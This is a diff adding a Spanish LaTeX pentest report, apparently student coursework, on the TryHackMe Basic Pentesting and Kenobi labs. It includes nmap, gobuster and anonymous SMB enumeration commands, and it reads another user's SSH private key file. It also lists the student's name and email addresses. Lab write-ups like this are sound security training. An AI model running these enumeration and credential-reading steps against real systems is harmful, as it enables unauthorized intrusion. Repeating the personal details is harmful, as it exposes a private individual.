@@ -1,0 +1,1997 @@
+\documentclass[11pt,a4paper]{article}
+
+% =========================================================
+% PAQUETES
+% =========================================================
+\usepackage[utf8]{inputenc}
+\usepackage[T1]{fontenc}
+\usepackage{babel}
+\babelprovide[main]{spanish}
+\setlocalecaption{spanish}{contents}{Índice}
+\setlocalecaption{spanish}{figure}{Figura}
+\setlocalecaption{spanish}{part}{Parte}
+\usepackage[a4paper,margin=2.3cm,headheight=15pt]{geometry}
+\usepackage{graphicx}
+\usepackage{xcolor}
+\usepackage{colortbl}
+\usepackage{array}
+\usepackage{longtable}
+\usepackage{booktabs}
+\usepackage{tabularx}
+\usepackage{float}
+\usepackage{fancyhdr}
+\usepackage{lastpage}
+\usepackage{hyperref}
+\usepackage{enumitem}
+\usepackage{titlesec}
+\usepackage{tcolorbox}
+\usepackage{listings}
+\usepackage{caption}
+\usepackage{parskip}
+\usepackage[expansion=false]{microtype}
+
+% =========================================================
+% CONFIGURACIÓN GENERAL
+% =========================================================
+
+\hypersetup{
+    colorlinks=true,
+    linkcolor=blue!50!black,
+    urlcolor=blue!50!black,
+    citecolor=blue!50!black,
+    pdftitle={Informe de Pentesting - INSECUR S.A.},
+    pdfauthor={Camila Olivera},
+    pdfsubject={Actividad A08 - Hacking Ético}
+}
+
+\setlength{\parindent}{0pt}
+\setlength{\parskip}{6pt}
+
+\definecolor{insecblue}{HTML}{17365D}
+\definecolor{critical}{HTML}{F4CCCC}
+\definecolor{high}{HTML}{FCE5CD}
+\definecolor{medium}{HTML}{FFF2CC}
+\definecolor{low}{HTML}{D9EAD3}
+\definecolor{lightblue}{HTML}{EAF2F8}
+\definecolor{darkgray}{HTML}{444444}
+
+\titleformat{\section}
+{\Large\bfseries\color{insecblue}}
+{\thesection.}{0.5em}{}
+
+\titleformat{\subsection}
+{\large\bfseries\color{insecblue}}
+{\thesubsection.}{0.5em}{}
+
+\titleformat{\subsubsection}
+{\normalsize\bfseries\color{darkgray}}
+{\thesubsubsection.}{0.5em}{}
+
+\pagestyle{fancy}
+\fancyhf{}
+\lhead{\small INSECUR S.A. -- Actividad A08}
+\rhead{\small Hacking Ético}
+\cfoot{\small Página \thepage\ de \pageref{LastPage}}
+\renewcommand{\headrulewidth}{0.4pt}
+\renewcommand{\footrulewidth}{0.4pt}
+
+% =========================================================
+% CONFIGURACIÓN DE CÓDIGO
+% =========================================================
+
+\lstset{
+    basicstyle=\ttfamily\small,
+    breaklines=true,
+    frame=single,
+    backgroundcolor=\color{gray!8},
+    columns=fullflexible,
+    keepspaces=true
+}
+
+% =========================================================
+% COMANDOS AUXILIARES
+% =========================================================
+
+\newcommand{\evidence}[2]{
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.94\textwidth]{#1}
+    \caption{#2}
+\end{figure}
+}
+
+\newcommand{\findingbox}[3]{
+\begin{tcolorbox}[
+    colback=#1,
+    colframe=black!35,
+    title=\textbf{#2},
+    fonttitle=\bfseries
+]
+#3
+\end{tcolorbox}
+}
+
+% =========================================================
+% DOCUMENTO
+% =========================================================
+
+\begin{document}
+
+% =========================================================
+% PORTADA
+% =========================================================
+
+\begin{titlepage}
+\centering
+
+\vspace*{1.5cm}
+
+{\Huge\bfseries\color{insecblue} INSECUR S.A.}
+
+\vspace{0.4cm}
+
+{\Large Seguridad Aplicada a Sistemas de Información}
+
+\vspace{1.5cm}
+
+\begin{tcolorbox}[
+    colback=lightblue,
+    colframe=insecblue,
+    width=0.88\textwidth,
+    arc=3mm
+]
+\centering
+{\LARGE\bfseries Actividad A08-- HACKING ÉTICO}\\[0.3cm]
+{\Huge\bfseries INFORME DE PENTESTING}\\[0.4cm]
+{\Large Basic Pentesting + Kenobi}
+\end{tcolorbox}
+\vspace{1.5cm}
+
+\begin{tabular}{>{\bfseries}l l}
+Cliente: & INSECUR S.A.\\
+Laboratorio: & TryHackMe\\
+Salas evaluadas: & Basic Pentesting + Kenobi\\
+Alumna: & Camila Olivera\\
+Usuario TryHackMe: & camiluolivera2506\\
+Correo institucional: & oliveracamila@uch.edu.ar\\
+Correo personal: & camiluolivera2506@gmail.com\\
+Período de trabajo: & 25/09/2026 -- 30/09/2026\\
+Branch prevista: & Olivera-Camila\\
+\end{tabular}
+
+\vfill
+
+{\large Documento elaborado con fines exclusivamente académicos}
+
+\vspace{0.5cm}
+
+{\large 2026}
+
+\end{titlepage}
+\pagenumbering{arabic}
+\setcounter{page}{1}
+
+% =========================================================
+% CONTROL DEL DOCUMENTO
+% =========================================================
+
+\section*{Control del documento}
+
+\begin{center}
+\begin{tabularx}{\textwidth}{|l|X|}
+\hline
+\textbf{Campo} & \textbf{Información}\\
+\hline
+Documento & Informe de Pentesting\\
+\hline
+Actividad & A08 -- Hacking Ético\\
+\hline
+Cliente & INSECUR S.A.\\
+\hline
+Entorno & TryHackMe\\
+\hline
+Sala & Basic Pentesting\\
+\hline
+Responsable & Camila Olivera\\
+\hline
+Fecha de inicio & 25/09/2026\\
+\hline
+Fecha de cierre & 26/09/2026\\
+\hline
+Versión & 1.0\\
+\hline
+\end{tabularx}
+\end{center}
+
+\vspace{1cm}
+
+\begin{tcolorbox}[colback=yellow!8,colframe=orange!60!black]
+\textbf{Clasificación:} Documento académico de evaluación de seguridad realizado
+exclusivamente sobre el entorno autorizado de TryHackMe indicado en el alcance.
+\end{tcolorbox}
+
+\newpage
+
+% =========================================================
+% ÍNDICE
+% =========================================================
+
+\tableofcontents
+
+\newpage
+
+% =========================================================
+% 1. RESUMEN EJECUTIVO
+% =========================================================
+
+\part{Núcleo obligatorio}
+
+\section{Resumen ejecutivo}
+
+Durante la evaluación de seguridad realizada sobre el entorno autorizado de
+TryHackMe se identificaron cuatro hallazgos relevantes durante las fases de
+reconocimiento, enumeración, explotación y post-explotación.
+
+Los hallazgos identificados fueron:
+
+\begin{itemize}
+    \item exposición de información interna mediante un directorio web accesible;
+    \item utilización de credenciales que permitieron acceso remoto mediante SSH;
+    \item exposición de una clave privada SSH perteneciente a otro usuario;
+    \item acceso anónimo a un recurso compartido SMB.
+\end{itemize}
+
+Los hallazgos afectan principalmente la confidencialidad de la información y
+los controles de autenticación y autorización del sistema.
+
+\begin{center}
+\begin{tabular}{|c|c|c|}
+\hline
+\textbf{Severidad} & \textbf{Cantidad} & \textbf{Hallazgos}\\
+\hline
+\cellcolor{critical}\textbf{Crítica} & 0 & --\\
+\hline
+\cellcolor{high}\textbf{Alta} & 1 & H-03\\
+\hline
+\cellcolor{medium}\textbf{Media} & 3 & H-01, H-02, H-04\\
+\hline
+\cellcolor{low}\textbf{Baja} & 0 & --\\
+\hline
+\textbf{Total} & \textbf{4} & \textbf{H-01 a H-04}\\
+\hline
+\end{tabular}
+\end{center}
+
+Las recomendaciones principales se orientan a fortalecer los controles de
+acceso, aplicar políticas robustas de autenticación, restringir recursos
+compartidos, proteger las claves privadas y separar adecuadamente los recursos
+de desarrollo de los entornos destinados a producción.
+
+% =========================================================
+% 2. DATOS GENERALES
+% =========================================================
+
+\section{Datos generales}
+
+\subsection{Identificación de la evaluación}
+
+\begin{center}
+\begin{tabularx}{\textwidth}{|l|X|}
+\hline
+\textbf{Elemento} & \textbf{Detalle}\\
+\hline
+Cliente & INSECUR S.A.\\
+\hline
+Actividad & A08 -- Hacking Ético\\
+\hline
+Entorno & TryHackMe\\
+\hline
+Sala & Basic Pentesting\\
+\hline
+Usuario THM & camiluolivera2506\\
+\hline
+Alumna & Camila Olivera\\
+\hline
+Fecha de inicio & 25/09/2026\\
+\hline
+Fecha de cierre & 26/09/2026\\
+\hline
+\end{tabularx}
+\end{center}
+
+\subsection{Objetivo}
+
+El objetivo de la actividad fue realizar una evaluación de seguridad controlada
+sobre el entorno autorizado de TryHackMe, aplicando técnicas de reconocimiento,
+enumeración, identificación de vulnerabilidades, explotación controlada y
+post-explotación.
+
+La evaluación tuvo como finalidad identificar debilidades de seguridad,
+documentar evidencias y proponer medidas de mitigación.
+
+\subsection{Alcance}
+
+El alcance estuvo limitado al laboratorio autorizado de TryHackMe
+correspondiente a la actividad práctica.
+
+No se realizaron actividades fuera del entorno autorizado.
+
+\subsection{Reglas de operación}
+
+Las actividades fueron realizadas con fines exclusivamente académicos y sobre
+el objetivo autorizado.
+
+Las acciones se limitaron a técnicas necesarias para la evaluación del
+laboratorio, evitando la extracción innecesaria de información sensible.
+
+% =========================================================
+% 3. PRE-PENTESTING
+% =========================================================
+
+\section{Pre-pentesting}
+
+\subsection{Autorización}
+
+La evaluación se realizó dentro del alcance autorizado establecido para la
+Actividad A08 -- Hacking Ético, utilizando TryHackMe como entorno controlado.
+
+\subsection{Metodología}
+
+El trabajo siguió un flujo de pentesting compuesto por:
+
+\begin{enumerate}
+    \item reconocimiento;
+    \item escaneo;
+    \item enumeración;
+    \item identificación de vulnerabilidades;
+    \item explotación controlada;
+    \item post-explotación;
+    \item documentación;
+    \item recomendaciones y cierre.
+\end{enumerate}
+
+\subsection{Herramientas utilizadas}
+
+Durante la actividad se utilizaron herramientas disponibles en Kali Linux,
+entre ellas:
+
+\begin{itemize}
+    \item Nmap;
+    \item Gobuster;
+    \item cURL;
+    \item smbclient;
+    \item cliente SSH;
+    \item herramientas de terminal de Linux;
+    \item OpenVPN para conexión al entorno de TryHackMe.
+\end{itemize}
+
+% =========================================================
+% 4. RECONOCIMIENTO
+% =========================================================
+
+\section{Reconocimiento}
+
+\subsection{Conectividad}
+
+El objetivo inicial documentado fue:
+
+\begin{lstlisting}
+10.64.160.174
+\end{lstlisting}
+
+La conectividad fue comprobada mediante:
+
+\begin{lstlisting}
+ping -c 4 10.64.160.174
+\end{lstlisting}
+
+Se obtuvieron cuatro respuestas, sin pérdida de paquetes.
+
+\evidence{
+evidencias/reconocimiento/reconocimiento_BP-04_ping.png
+}{
+Prueba de conectividad con el objetivo autorizado.
+}
+
+\subsection{Entorno VPN}
+
+La conexión al laboratorio se realizó mediante OpenVPN.
+
+La interfaz utilizada permitió establecer conectividad entre Kali Linux y el
+entorno de TryHackMe.
+
+\evidence{
+evidencias/reconocimiento/BP-00_vpn_tun0.png
+}{
+Interfaz de red utilizada para la conexión al laboratorio.
+}
+
+% =========================================================
+% 5. ESCANEO Y ENUMERACIÓN
+% =========================================================
+
+\section{Escaneo y enumeración}
+
+\subsection{Nmap}
+
+Se realizó un escaneo de los principales puertos utilizando detección de
+servicios y scripts básicos:
+
+\begin{lstlisting}
+nmap -sC -sV --top-ports 1000 -T3 \
+-oA /home/kali/TP_THM/evidencias/escaneo/BP-03_nmap \
+10.64.160.174
+\end{lstlisting}
+
+El análisis permitió identificar, entre otros, los siguientes servicios:
+
+\begin{center}
+\begin{tabular}{|c|l|l|}
+\hline
+\textbf{Puerto} & \textbf{Servicio} & \textbf{Versión / información}\\
+\hline
+22 & SSH & OpenSSH 8.2p1 Ubuntu\\
+\hline
+80 & HTTP & Apache httpd 2.4.41\\
+\hline
+139 & NetBIOS/SMB & Samba\\
+\hline
+445 & SMB & Samba\\
+\hline
+8009 & AJP13 & Apache Jserv\\
+\hline
+8080 & HTTP & Apache Tomcat 9.0.7\\
+\hline
+\end{tabular}
+\end{center}
+
+\evidence{
+evidencias/escaneo/escaneo_BP-03_nmap-01.png
+}{
+Resultado del escaneo Nmap -- servicios y puertos identificados.
+}
+
+\evidence{
+evidencias/escaneo/escaneo_BP-03_nmap-02.png
+}{
+Continuación del resultado del escaneo Nmap.
+}
+
+\subsection{Enumeración web}
+
+Se realizó una consulta HTTP inicial:
+
+\begin{lstlisting}
+curl -i http://10.64.160.174/
+\end{lstlisting}
+
+El servidor respondió correctamente y mostró una página de mantenimiento con
+una referencia a una sección de notas de desarrollo.
+
+Posteriormente se utilizó Gobuster:
+
+\begin{lstlisting}
+gobuster dir -u http://10.64.160.174/ \
+-w /usr/share/wordlists/dirb/common.txt \
+-o /home/kali/TP_THM/evidencias/escaneo/BP-04_gobuster80.txt
+\end{lstlisting}
+
+Entre los resultados se identificó el recurso:
+
+\begin{lstlisting}
+/development/
+\end{lstlisting}
+
+\evidence{
+evidencias/escaneo/escaneo_BP-04_gobuster80.png
+}{
+Enumeración de directorios mediante Gobuster.
+}
+
+El contenido del directorio fue consultado mediante:
+
+\begin{lstlisting}
+curl -s http://10.64.160.174/development/
+\end{lstlisting}
+
+Se identificaron los archivos:
+
+\begin{itemize}
+    \item \texttt{dev.txt}
+    \item \texttt{j.txt}
+\end{itemize}
+
+\evidence{
+evidencias/escaneo/escaneo_BP-05_development_dev.png
+}{
+Contenido del archivo dev.txt.
+}
+
+\evidence{
+evidencias/escaneo/escaneo_BP-06_development_j.png
+}{
+Contenido del archivo j.txt.
+}
+
+\subsection{Enumeración SMB}
+
+Se realizó una enumeración de recursos SMB:
+
+\begin{lstlisting}
+smbclient -L //10.64.160.174 -N
+\end{lstlisting}
+
+Se identificó el recurso compartido \texttt{Anonymous}.
+
+Posteriormente se accedió al recurso:
+
+\begin{lstlisting}
+smbclient //10.64.160.174/Anonymous -N
+\end{lstlisting}
+
+Dentro del recurso se encontró el archivo:
+
+\begin{lstlisting}
+staff.txt
+\end{lstlisting}
+
+\evidence{
+evidencias/escaneo/escaneo_H-04_smb_anonymous.png
+}{
+Enumeración y acceso al recurso compartido Anonymous.
+}
+
+El archivo fue descargado mediante \texttt{get} y posteriormente visualizado.
+
+\evidence{
+evidencias/escaneo/escaneo_H-04_smb_staff.png
+}{
+Contenido de staff.txt obtenido desde el recurso SMB.
+}
+
+% =========================================================
+% 6. HALLAZGOS
+% =========================================================
+
+\section{Hallazgos por fase}
+
+\subsection{H-01 -- Exposición de información interna mediante recurso web accesible}
+
+\findingbox{medium}{Severidad: MEDIA}{
+\textbf{ID:} H-01\\
+\textbf{Fase:} Escaneo / Enumeración\\
+\textbf{CWE:} CWE-200 -- Exposure of Sensitive Information to an Unauthorized Actor\\
+\textbf{CVE:} No aplica.
+}
+
+\subsubsection{Descripción}
+
+Se identificó el directorio web \texttt{/development/}, accesible sin
+autenticación.
+
+El contenido incluía archivos relacionados con información de desarrollo y
+configuración interna. Entre la información observada se encuentra una
+referencia a Apache Struts 2.5.12, información sobre SMB y Apache y notas
+internas relacionadas con credenciales.
+
+La evidencia disponible demuestra exposición de información. No se afirma que
+la versión mencionada de Struts haya sido explotada durante esta evaluación.
+
+\subsubsection{Componente afectado}
+
+Servidor web Apache y directorio:
+
+\begin{lstlisting}
+/development/
+\end{lstlisting}
+
+\subsubsection{Evidencia}
+
+\begin{itemize}
+    \item \texttt{escaneo\_BP-04\_gobuster80.png}
+    \item \texttt{escaneo\_BP-05\_development\_dev.png}
+    \item \texttt{escaneo\_BP-06\_development\_j.png}
+    \item \texttt{BP-04\_gobuster80.txt}
+\end{itemize}
+
+\subsubsection{Impacto}
+
+El principal impacto identificado corresponde a la confidencialidad, debido a
+que información destinada al desarrollo se encuentra disponible desde un
+recurso web accesible.
+
+\subsubsection{Salvaguardas recomendadas}
+
+\begin{itemize}
+    \item eliminar notas y archivos de desarrollo del entorno productivo;
+    \item restringir el acceso al directorio;
+    \item implementar controles de autenticación y autorización;
+    \item separar los entornos de desarrollo y producción;
+    \item revisar periódicamente el contenido publicado por el servidor web.
+\end{itemize}
+
+\subsubsection{Riesgo residual}
+
+Bajo, una vez aplicados los controles de acceso y eliminada la información de
+desarrollo del entorno expuesto.
+
+% ---------------------------------------------------------
+
+\subsection{H-02 -- Credenciales débiles que permiten acceso SSH}
+
+\findingbox{medium}{Severidad: MEDIA}{
+\textbf{ID:} H-02\\
+\textbf{Fase:} Explotación\\
+\textbf{CWE:} CWE-521 -- Weak Password Requirements\\
+\textbf{CVE:} No aplica.
+}
+
+\subsubsection{Descripción}
+
+El servicio SSH identificado en el puerto 22 permitió validar acceso remoto
+utilizando las credenciales correspondientes al usuario \texttt{jan}.
+
+Una vez establecida la sesión, se verificó la identidad mediante:
+
+\begin{lstlisting}
+whoami
+id
+\end{lstlisting}
+
+La cuenta correspondía a:
+
+\begin{lstlisting}
+jan
+\end{lstlisting}
+
+Es importante aclarar que durante la evaluación la herramienta Hydra no
+permitió determinar exitosamente la contraseña. Por este motivo, este informe
+no atribuye a Hydra el descubrimiento de las credenciales.
+
+\subsubsection{Componente afectado}
+
+Servicio SSH y cuenta de usuario \texttt{jan}.
+
+\subsubsection{Evidencia}
+
+\evidence{
+evidencias/explotacion/explotacion_BP-05_acceso_ssh_jan-01.png
+}{
+Inicio de la conexión SSH al usuario jan.
+}
+
+\evidence{
+evidencias/explotacion/explotacion_BP-05_acceso_ssh_jan-02.png
+}{
+Sesión SSH establecida como usuario jan.
+}
+
+\subsubsection{Impacto}
+
+El acceso remoto a una cuenta de usuario puede permitir acceso no autorizado a
+recursos del sistema, dependiendo de los permisos asociados a la cuenta.
+
+El impacto observado durante esta evaluación se concentra principalmente en
+confidencialidad e integridad.
+
+\subsubsection{Salvaguardas recomendadas}
+
+\begin{itemize}
+    \item utilizar contraseñas robustas y únicas;
+    \item preferir autenticación mediante claves SSH protegidas;
+    \item restringir el acceso SSH a usuarios y redes autorizadas;
+    \item implementar MFA cuando el entorno lo permita;
+    \item aplicar mecanismos de limitación de intentos de autenticación;
+    \item revisar periódicamente las cuentas existentes.
+\end{itemize}
+
+\subsubsection{Riesgo residual}
+
+Bajo, después de aplicar controles de autenticación y restricción de acceso.
+
+% ---------------------------------------------------------
+
+\subsection{H-03 -- Exposición de clave privada SSH de otro usuario}
+
+\findingbox{high}{Severidad: ALTA}{
+\textbf{ID:} H-03\\
+\textbf{Fase:} Post-explotación\\
+\textbf{CWE:} CWE-732 -- Incorrect Permission Assignment for Critical Resource\\
+\textbf{CVE:} No aplica.
+}
+
+\subsubsection{Descripción}
+
+Durante la enumeración del sistema con la cuenta \texttt{jan}, se identificó
+que era posible acceder al directorio personal del usuario \texttt{kay}.
+
+Dentro de dicho directorio se identificó:
+
+\begin{lstlisting}
+/home/kay/.ssh/id_rsa
+\end{lstlisting}
+
+La clave privada pudo ser leída. La evidencia mostró que la clave se encontraba
+protegida mediante cifrado y passphrase.
+
+Por lo tanto, la evaluación demuestra exposición de una clave privada, pero no
+se afirma que la cuenta \texttt{kay} haya sido comprometida mediante dicha
+clave.
+
+\subsubsection{Componente afectado}
+
+Sistema de archivos Linux y directorio:
+
+\begin{lstlisting}
+/home/kay/.ssh/
+\end{lstlisting}
+
+\subsubsection{Evidencia}
+
+\evidence{
+evidencias/explotacion/explotacion_BP-06_enumeracion_jan_kay.png
+}{
+Enumeración del directorio personal del usuario kay.
+}
+
+\evidence{
+evidencias/explotacion/explotacion_BP-07_kay_ssh_key.png
+}{
+Identificación de la clave privada SSH de kay.
+}
+
+\evidence{
+evidencias/explotacion/explotacion_BP-08_kay_id_rsa_encrypted.png
+}{
+Primeras líneas de la clave privada, donde se observa que se encuentra cifrada.
+}
+
+\subsubsection{Impacto}
+
+La exposición de una clave privada constituye una debilidad importante de
+control de acceso. Si una clave privada pudiera utilizarse sin protección
+adicional, podría permitir autenticación como el usuario propietario.
+
+En este caso, la clave observada estaba cifrada, por lo que no se demostró su
+utilización para acceder como \texttt{kay}.
+
+El impacto potencial comprende confidencialidad e integridad.
+
+\subsubsection{Salvaguardas recomendadas}
+
+\begin{itemize}
+    \item aplicar permisos restrictivos sobre directorios personales;
+    \item garantizar que las claves privadas sean accesibles únicamente por su
+    propietario;
+    \item utilizar passphrases robustas;
+    \item implementar procedimientos de gestión y rotación de claves;
+    \item eliminar claves innecesarias;
+    \item revisar periódicamente permisos del sistema de archivos.
+\end{itemize}
+
+\subsubsection{Riesgo residual}
+
+Bajo, siempre que las claves privadas permanezcan cifradas y sean accesibles
+exclusivamente por sus propietarios.
+
+% ---------------------------------------------------------
+
+\subsection{H-04 -- Acceso anónimo a recurso compartido SMB}
+
+\findingbox{medium}{Severidad: MEDIA}{
+\textbf{ID:} H-04\\
+\textbf{Fase:} Escaneo / Enumeración\\
+\textbf{CWE:} CWE-306 -- Missing Authentication for Critical Function\\
+\textbf{CVE:} No aplica.
+}
+
+\subsubsection{Descripción}
+
+Se identificó un recurso compartido SMB denominado \texttt{Anonymous} que
+permitió acceso sin autenticación.
+
+Dentro del recurso se encontró el archivo \texttt{staff.txt}, cuyo contenido
+incluía información interna dirigida al personal.
+
+\subsubsection{Componente afectado}
+
+Servicio Samba/SMB y recurso compartido:
+
+\begin{lstlisting}
+Anonymous
+\end{lstlisting}
+
+\subsubsection{Impacto}
+
+El acceso anónimo puede facilitar la consulta o extracción de información
+interna por usuarios no autenticados.
+
+El impacto observado corresponde principalmente a la confidencialidad.
+
+\subsubsection{Salvaguardas recomendadas}
+
+\begin{itemize}
+    \item deshabilitar el acceso anónimo;
+    \item exigir autenticación para los recursos compartidos;
+    \item aplicar principio de mínimo privilegio;
+    \item revisar periódicamente los permisos de los recursos SMB;
+    \item eliminar información interna innecesaria de recursos compartidos.
+\end{itemize}
+
+\subsubsection{Riesgo residual}
+
+Bajo, luego de deshabilitar el acceso anónimo y revisar los permisos.
+
+% =========================================================
+% 6.4 RESUMEN
+% =========================================================
+
+\subsection{Resumen de hallazgos}
+
+\begin{center}
+\begin{longtable}{|p{1.2cm}|p{4.4cm}|p{2.1cm}|p{3.2cm}|}
+\hline
+\textbf{ID} & \textbf{Hallazgo} & \textbf{Severidad} & \textbf{Impacto principal}\\
+\hline
+H-01 & Exposición de información interna mediante recurso web & Media & Confidencialidad\\
+\hline
+H-02 & Credenciales débiles con acceso SSH & Media & Confidencialidad / Integridad\\
+\hline
+H-03 & Exposición de clave privada SSH & Alta & Confidencialidad / Integridad\\
+\hline
+H-04 & Acceso anónimo a recurso SMB & Media & Confidencialidad\\
+\hline
+\end{longtable}
+\end{center}
+
+% =========================================================
+% 7. RECOMENDACIONES
+% =========================================================
+
+\section{Recomendaciones post-pentesting}
+
+\subsection{Recomendaciones técnicas}
+
+\subsubsection{Protección de recursos web}
+
+Se recomienda eliminar recursos de desarrollo del entorno productivo y
+restringir mediante autenticación cualquier directorio que deba permanecer
+accesible únicamente para personal autorizado.
+
+\subsubsection{Fortalecimiento de SSH}
+
+Se recomienda fortalecer las credenciales, limitar el acceso remoto, utilizar
+claves SSH adecuadamente protegidas y considerar mecanismos adicionales de
+autenticación.
+
+\subsubsection{Protección de claves privadas}
+
+Las claves privadas deben permanecer accesibles únicamente por sus propietarios.
+Se deben aplicar permisos restrictivos, utilizar passphrases y establecer
+procedimientos de gestión y rotación.
+
+\subsubsection{Seguridad de SMB}
+
+Se recomienda deshabilitar los recursos anónimos y establecer autenticación y
+autorización explícitas para cada recurso compartido.
+
+\subsection{Recomendaciones administrativas}
+
+\begin{itemize}
+    \item establecer una política formal de contraseñas;
+    \item realizar revisiones periódicas de usuarios y permisos;
+    \item establecer procedimientos de ciclo de vida para claves SSH;
+    \item capacitar al personal sobre protección de credenciales;
+    \item realizar revisiones periódicas de configuraciones expuestas;
+    \item mantener separación entre desarrollo y producción;
+    \item documentar los cambios de configuración de servicios críticos.
+\end{itemize}
+
+% =========================================================
+% 8. PROTOCOLO DE CONTINGENCIA
+% =========================================================
+
+\section{Protocolo de contingencia}
+
+\subsection{Escenario de contingencia}
+
+Se considera como escenario de contingencia un compromiso de una cuenta de
+usuario mediante credenciales débiles y el posterior acceso no autorizado a
+recursos internos del sistema.
+
+\subsection{Impacto sobre la continuidad del negocio}
+
+Un incidente de estas características podría afectar la confidencialidad de
+la información y, dependiendo de los permisos de la cuenta comprometida,
+también la integridad de recursos.
+
+Las actividades de contención y recuperación podrían requerir una interrupción
+temporal de determinados servicios.
+
+\subsection{Plan de respuesta}
+
+\subsubsection{1. Activación}
+
+El protocolo deberá activarse ante:
+
+\begin{itemize}
+    \item detección de accesos SSH no autorizados;
+    \item actividad anómala de autenticación;
+    \item acceso inesperado a recursos sensibles;
+    \item alertas provenientes de mecanismos de monitoreo;
+    \item evidencia de exposición de credenciales o claves.
+\end{itemize}
+
+\subsubsection{2. Contención -- primeros 15 minutos}
+
+Las primeras acciones deberán estar orientadas a evitar la propagación del
+incidente:
+
+\begin{enumerate}
+    \item deshabilitar las cuentas comprometidas;
+    \item revocar las claves SSH potencialmente expuestas;
+    \item restringir temporalmente el acceso SSH;
+    \item deshabilitar recursos SMB anónimos;
+    \item aislar el servidor si fuera necesario;
+    \item preservar logs y evidencias;
+    \item evitar modificaciones innecesarias sobre el sistema afectado.
+\end{enumerate}
+
+\subsubsection{3. Recuperación}
+
+Una vez contenida la situación:
+
+\begin{enumerate}
+    \item corregir los permisos incorrectos;
+    \item cambiar o rotar las credenciales comprometidas;
+    \item generar nuevas claves SSH cuando corresponda;
+    \item retirar recursos de desarrollo expuestos;
+    \item revisar configuraciones de SMB y SSH;
+    \item verificar respaldos disponibles;
+    \item restaurar servicios de manera controlada;
+    \item comprobar el funcionamiento seguro antes de volver a producción.
+\end{enumerate}
+
+\subsubsection{4. Comunicación}
+
+El incidente deberá ser comunicado a los responsables correspondientes de
+seguridad, infraestructura y dirección, siguiendo los procedimientos internos
+y legales aplicables.
+
+En caso de existir información perteneciente a terceros, deberá respetarse el
+procedimiento correspondiente para su tratamiento y comunicación.
+
+\subsubsection{5. Post-mortem}
+
+Luego de la recuperación deberá elaborarse un informe que incluya:
+
+\begin{itemize}
+    \item causa del incidente;
+    \item sistemas afectados;
+    \item cuentas involucradas;
+    \item información potencialmente expuesta;
+    \item acciones realizadas;
+    \item impacto;
+    \item medidas correctivas;
+    \item medidas preventivas.
+\end{itemize}
+
+\subsection{Objetivos de recuperación propuestos}
+
+Los siguientes valores se proponen exclusivamente como objetivos académicos
+para el ejercicio y no representan valores reales establecidos por INSECUR S.A.
+
+\begin{center}
+\begin{tabular}{|c|c|p{8cm}|}
+\hline
+\textbf{Indicador} & \textbf{Valor propuesto} & \textbf{Descripción}\\
+\hline
+RTO & 4 horas & Tiempo objetivo para recuperar la operación principal.\\
+\hline
+RPO & 1 hora & Pérdida máxima de información aceptable considerada para el ejercicio.\\
+\hline
+\end{tabular}
+\end{center}
+
+% =========================================================
+% 9. CONCLUSIONES
+% =========================================================
+
+\section{Conclusiones}
+
+La evaluación permitió aplicar un proceso de pentesting controlado sobre un
+entorno de laboratorio autorizado, comenzando con reconocimiento y
+enumeración, continuando con la validación de accesos y finalizando con
+actividades de post-explotación y documentación.
+
+Se identificaron cuatro hallazgos: exposición de información interna en un
+recurso web, acceso remoto mediante credenciales de usuario, exposición de una
+clave privada SSH y acceso anónimo a un recurso compartido SMB.
+
+La evaluación también permitió comprobar la importancia de combinar controles
+de autenticación, autorización, gestión de credenciales, permisos del sistema
+de archivos y configuración segura de servicios.
+
+Las recomendaciones propuestas buscan reducir la exposición de información,
+fortalecer los controles de acceso y mejorar la protección de credenciales y
+recursos compartidos.
+
+% =========================================================
+\newpage
+% PARTE II -- SALA DE ELECCIÓN: KENOBI
+% =========================================================
+
+\newpage
+\part{Sala de elección: Kenobi}
+
+\section{Reconocimiento -- Kenobi}
+
+\subsection{Objetivo}
+
+La segunda parte de la evaluación correspondió a la sala
+\textit{Kenobi} de TryHackMe, seleccionada como sala de elección dentro
+de la actividad A08.
+
+El objetivo fue identificar servicios expuestos, enumerar los recursos
+disponibles, validar vulnerabilidades dentro del laboratorio autorizado y
+documentar una cadena de explotación controlada hasta la obtención de
+privilegios elevados.
+
+\subsection{Identificación del objetivo}
+Fecha de ejecución: 30/09/2026.\par
+
+El objetivo asignado para la evaluación fue:
+
+\begin{lstlisting}
+10.64.134.243
+\end{lstlisting}
+
+La conectividad fue comprobada mediante:
+
+\begin{lstlisting}
+ping -c 4 10.64.134.243
+\end{lstlisting}
+
+Se obtuvieron cuatro respuestas sin pérdida de paquetes.
+
+\evidence{
+evidencias/reconocimiento/reconocimiento_KB-01_ping.png
+}{
+Prueba de conectividad con el objetivo de la sala Kenobi.
+}
+
+\subsection{Entorno de trabajo}
+
+La evaluación se realizó desde Kali Linux mediante la conexión VPN
+establecida con el entorno autorizado de TryHackMe.
+
+La ruta hacia el objetivo fue verificada mediante la interfaz
+\texttt{tun0}, utilizada para la comunicación con el laboratorio.
+
+% =========================================================
+% ESCANEO Y ENUMERACIÓN
+% =========================================================
+
+\section{Escaneo y enumeración -- Kenobi}
+
+\subsection{Escaneo de puertos}
+
+Se realizó un escaneo completo de puertos TCP para identificar los
+servicios expuestos:
+
+\begin{lstlisting}
+nmap -p- --min-rate 5000 -T4 \
+-oA ~/TP_THM/evidencias/escaneo/KB-02_nmap \
+10.64.134.243
+\end{lstlisting}
+
+El análisis permitió identificar los siguientes puertos abiertos:
+
+\begin{center}
+\begin{tabular}{|c|l|}
+\hline
+\textbf{Puerto} & \textbf{Servicio identificado}\\
+\hline
+21 & FTP\\
+\hline
+22 & SSH\\
+\hline
+80 & HTTP\\
+\hline
+111 & RPCbind\\
+\hline
+139 & NetBIOS/SMB\\
+\hline
+445 & SMB\\
+\hline
+2049 & NFS\\
+\hline
+35437 & Nlockmgr\\
+\hline
+43057 & Mountd\\
+\hline
+48695 & Mountd\\
+\hline
+58469 & Mountd\\
+\hline
+\end{tabular}
+\end{center}
+
+\evidence{
+evidencias/escaneo/escaneo_KB-02_nmap_puertos.png
+}{
+Resultado del escaneo completo de puertos TCP.
+}
+
+\subsection{Identificación de servicios}
+
+Se realizó posteriormente detección de versiones y scripts básicos sobre
+los puertos identificados:
+
+\begin{lstlisting}
+nmap -sC -sV \
+-p 21,22,80,111,139,445,2049,35437,43057,48695,58469 \
+-oA ~/TP_THM/evidencias/escaneo/KB-03_nmap_servicios \
+10.64.134.243
+\end{lstlisting}
+
+Entre los servicios identificados se encontraron:
+
+\begin{center}
+\begin{tabular}{|c|l|l|}
+\hline
+\textbf{Puerto} & \textbf{Servicio} & \textbf{Versión / información}\\
+\hline
+21 & FTP & ProFTPD 1.3.5\\
